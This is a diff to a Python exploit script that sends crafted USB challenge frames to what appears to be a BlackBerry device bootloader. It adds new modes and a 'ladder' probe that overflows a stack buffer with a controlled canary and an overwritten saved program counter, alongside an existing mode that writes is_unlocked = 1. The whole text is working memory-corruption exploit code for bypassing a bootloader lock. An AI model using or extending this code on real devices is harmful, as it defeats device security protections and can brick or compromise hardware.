@@ -63,6 +63,14 @@ def build_chal(mode="unlock"):
         wval = 0x41414141
         wtgt = DEVINFO_BASE + 0x24
         endpc = 0x8F600110               # self-branch infinite loop
+    elif mode == "spin2":
+        wval = 0x12345678
+        wtgt = DEVINFO_BASE + 0x24       # harmless write via gadget
+        endpc = 0x8F600110               # then spin
+    elif mode == "reboot2":
+        wval = 0x41414141
+        wtgt = DEVINFO_BASE + 0x24
+        endpc = 0x8F600020               # reset vector (warm bootloader re-init)
     else:
         wval = 0x00000001               # is_unlocked = 1
         wtgt = DEVINFO_BASE + 0x10
@@ -111,13 +119,42 @@ def build_chal(mode="unlock"):
     payload = struct.pack("<IHH", 0, len_a, len_b) + data_a + bytes(blob)
     return fr(0x2005, payload)
 
+def build_ladder(sl, pc):
+    """sl-ladder probe: only the canary is controlled; regs/PC are 0x41 or pc."""
+    img = bytearray(b"\x41" * sl)
+    w32(img, 0x88, CANARY)          # canary slot (if sl >= 0x8C)
+    if pc and sl >= 0xB4:
+        w32(img, 0xB0, pc)          # saved PC
+    data = bytes(img[::-1])
+    buf = bytearray(data)
+    buf.reverse()
+    assert bytes(buf) == bytes(img)
+    blob = bytearray()
+    blob += b"\x30\x81"
+    blob += bytes([(sl + 8) - 3])
+    blob += b"\x02" + bytes([sl])
+    blob += data
+    blob += b"\x02\x01\x00"
+    len_b = len(blob)
+    data_a = b"\x00\x05\x00\x06"
+    len_a = len(data_a)
+    payload = struct.pack("<IHH", 0, len_a, len_b) + data_a + bytes(blob)
+    return fr(0x2005, payload)
+
 def main():
     arg = sys.argv[1] if len(sys.argv) > 1 else "unlock"
     if arg == "dryrun":
         print(f"payload {len(build_chal('unlock'))} bytes: {build_chal('unlock').hex()}")
         return 0
-    mode = arg if arg in ("diag", "unlock", "reboot", "spin") else "unlock"
-    chal = build_chal(mode)
+    mode = arg if arg in ("diag", "unlock", "reboot", "reboot2", "spin", "spin2", "ladder") else "unlock"
+    if mode == "ladder":
+        # argv[2] = sl hex, argv[3] = pc hex (or 0 = leave untouched/0x41)
+        sl = int(sys.argv[2], 16)
+        pc = int(sys.argv[3], 16) if len(sys.argv) > 3 else 0
+        chal = build_ladder(sl, pc)
+        print(f"[*] mode = ladder sl={sl:#x} pc={pc:#x}")
+    else:
+        chal = build_chal(mode)
     print(f"[*] mode = {mode}")
     backend = lb.get_backend(find_library=lambda x: r"C:\bb10mt\libusb-1.0.dll")
     d = usb.core.find(idVendor=0x0FCA, idProduct=0x8040, backend=backend)
